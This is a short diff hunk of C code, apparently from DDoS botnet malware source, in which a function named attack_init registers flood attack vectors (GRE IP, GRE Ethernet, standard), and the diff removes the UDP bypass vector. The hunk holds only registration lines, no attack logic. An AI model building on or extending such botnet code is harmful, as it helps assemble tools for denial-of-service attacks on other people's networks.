@@ -35,7 +35,6 @@ BOOL attack_init(void)
 
     add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
     add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
-    add_attack(ATK_VEC_UDP_BYPASS, (ATTACK_FUNC)attack_udp_bypass);
     add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_std);
     return TRUE;
 }
